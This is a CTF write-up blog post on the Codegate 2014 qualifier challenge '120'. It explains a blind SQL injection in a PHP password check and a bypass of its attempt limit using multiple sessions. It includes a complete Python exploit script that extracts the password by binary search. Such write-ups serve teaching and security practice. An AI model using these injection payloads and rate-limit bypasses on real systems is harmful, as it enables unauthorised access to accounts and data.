---
title: Codegate CTF Quals 2014 120 writeup
author: fqj
layout: post
permalink: /2014-02-25-codegate-ctf-quals-2014-120-writeup/
comments: true
categories:
  - CTF
  - writeup
---

## Analysis

### SQL Injection

There's an SQL injection at 

      $query = "select * from rms_120_pw where (ip='$_SERVER[REMOTE_ADDR]') and (password='$_POST[password]')";

and the keyword filter does NOT filter blind injection.

      if (eregi("replace|load|information|union|select|from|where|limit|offset|order|by|ip|\.|#|-|/|\*",$_POST['password'])){

so we can post password=
    
    ' or (CONDITION) and '1'='1
    
to test whether the CONDITION is true of fasle.

And we can use binary search to get every byte of password.

But there's ONE more limit. The retry time is only 120 times. But `log(26)*30 > 120`.

### By-pass 120 times limit

The retry is limited to 120 times by the following code.

    if ( !isset($_SESSION['cnt'])){
        $_SESSION['cnt']=0;
        $_SESSION['password']=RandomString();
        
        $query = "delete from rms_120_pw where ip='$_SERVER[REMOTE_ADDR]'";
        @mysql_query($query);
        
        $query = "insert into rms_120_pw values('$_SERVER[REMOTE_ADDR]',             '$_SESSION[password]')";
        @mysql_query($query);
    }
    
There's one way to bypass it.

We need to make serveral queries without any session to get multiple sessions. And each time we request, the password is reset to another random value, so only the password generated in the last query is acceptable. But the `$_SESSION['cnt']` is still 120 for previous sessions. We can get at most `120 * num_of_sessions` times to do binary search blind injection.

## Exploit Code

```python
#!/usr/bin/env python2
import requests


ss = []

session_pool = [
        requests.session(),
        requests.session(),
        requests.session(),
        requests.session(),
        requests.session(),
        requests.session(),
        requests.session(),
        requests.session(),
        ]

counter = [
        1,
        1,
        1,
        1,
        1,
        1,
        1,
        1,
        ]

s = session_pool[0]
id = 0


for sss in session_pool:
    assert sss.post('http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/',
                data={
                    'password': "' OR LENGTH(password) = 30 AND '1'= '1"
                    }
                ).text == u'True'




for i in range(1, 31):
    l = 97
    r = 122
    j = (l + r) / 2
    while True:
        print i, l, r, j, id, counter[id]
        res = s.post('http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/',
                data={
                    'password': "' OR ASCII(SUBSTRING(password, %d, 1)) >= %d AND '1'= '1" % (i, j)
                    }
                ).text
        counter[id] += 1
        if counter[id] > 100:
            id += 1
            s = session_pool[id]
        if 'True' in res:
            l = j
            j = (l + r) / 2
            if r == l + 1:
                res2 = s.post('http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/',
                        data={
                            'password': "' OR ASCII(SUBSTRING(password, %d, 1)) = %d AND '1'= '1" % (i, j)
                            }
                        ).text
                counter[id] += 1
                if counter[id] > 100:
                    id += 1
                    s = session_pool[id]

                if 'True' in res2:
                    print j
                    ss.append(j)
                    break
                else:
                    print j + 1
                    ss.append(j + 1)
                    break
            elif l == r:
                print l
                ss.append(l)
                break
        else:
            r = j - 1
            j = (l + r) / 2

print ''.join(map(chr, ss))


print s.post('http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/auth.php',
        data={
            'password': ''.join(map(chr, ss))
            }
        ).text
```

